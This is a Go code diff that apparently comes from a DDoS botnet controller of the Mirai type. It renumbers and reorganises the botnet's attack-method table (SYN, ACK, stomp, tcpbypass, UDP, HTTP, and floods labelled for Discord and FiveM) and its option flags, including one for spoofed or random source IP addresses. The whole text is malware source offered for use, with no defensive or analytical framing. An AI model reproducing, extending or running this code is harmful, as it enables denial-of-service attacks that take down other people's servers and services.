@@ -125,126 +125,110 @@ var Flags map[string]Flag = map[string]Flag{
 		ID:          22,
 		Description: "HTTP path, default is /",
 	},
+
+	"https": {
+		ID:          23,
+		Description: "Use HTTPS instead of HTTP, default is 1 (yes)",
+	},
+
 	"conns": {
 		ID:          24,
 		Description: "Number of connections",
 	},
+
 	"source": {
 		ID:          25,
 		Description: "Source IP address, 255.255.255.255 for random",
 	},
-	"randlen": {
-		ID:          26,
-		Description: "Random length",
-	},
+
 	"minlen": {
-		ID:          27,
+		ID:          26,
 		Description: "Minimum length",
 	},
 	"maxlen": {
-		ID:          28,
+		ID:          27,
 		Description: "Maximum length",
 	},
 	"payload": {
-		ID:          29,
+		ID:          28,
 		Description: "Custom payload",
 	},
 	"repeat": {
-		ID:          30,
+		ID:          29,
 		Description: "How many times to repeat custom payload in packet (for UDP, TCP, and GRE floods)",
+	},
+	"randlen": {
+		ID:          37,
+		Description: "Random length",
 	},
 }
 
-// Holds all the methods which are valid
 var Methods map[string]*Method = map[string]*Method{
+
+	// TCP methods
 	".syn": {
 		Type:        0,
 		Flags:       []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
 		Description: "",
 	},
-
-	".udpthread": {
-		Type:        1,
-		Flags:       []uint8{0, 1, 7},
-		Description: "",
-	},
-
-	".greip": {
-		Type:        4,
-		Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
-		Description: "",
-	},
-
 	".ack": {
-		Type:        5,
+		Type:        1,
 		Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
 		Description: "",
 	},
-
 	".sack": {
-		Type:        6,
+		Type:        2,
 		Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
 		Description: "",
 	},
-
-	".stdhex": {
-		Type:        7,
-		Flags:       []uint8{0, 1, 7},
-		Description: "",
-	},
-
 	".socket": {
-		Type:        8,
-		Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
-		Description: "",
-	},
-
-	".tcpstream": {
-		Type:        9,
+		Type:        3,
 		Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
 		Description: "",
 	},
 
 	".stomp": {
-		Type:        12,
+		Type:        4,
 		Flags:       []uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16},
 		Description: "",
 	},
-
-	".http": {
-		Type:        13,
-		Flags:       []uint8{8, 7, 20, 21, 22, 24},
-		Description: "HTTP flood",
-	},
-
 	".tcpbypass": {
-		Type:        14,
+		Type:        5,
 		Flags:       []uint8{0, 7},
 		Description: "",
 	},
-
-	".nfo": {
-		Type:        15,
-		Flags:       []uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16},
-		Description: "",
-	},
-
-	".udpplain": {
-		Type:        16,
+	// UDP methods
+	".udpthread": {
+		Type:        6,
 		Flags:       []uint8{0, 1, 7},
 		Description: "",
 	},
-
+	".stdhex": {
+		Type:        7,
+		Flags:       []uint8{0, 1, 7},
+		Description: "",
+	},
+	".udpplain": {
+		Type:        8,
+		Flags:       []uint8{0, 1, 7},
+		Description: "",
+	},
 	".discord": {
-		Type:        18,
+		Type:        9,
 		Flags:       []uint8{0, 6, 7},
 		Description: "",
 	},
-
 	".fivem": {
-		Type:        19,
+		Type:        10,
 		Flags:       []uint8{0, 1, 7, 8, 30},
 		Description: "",
+	},
+
+	// HTTP method
+	".http": {
+		Type:        11,
+		Flags:       []uint8{8, 7, 20, 21, 22, 24},
+		Description: "HTTP flood",
 	},
 }
 
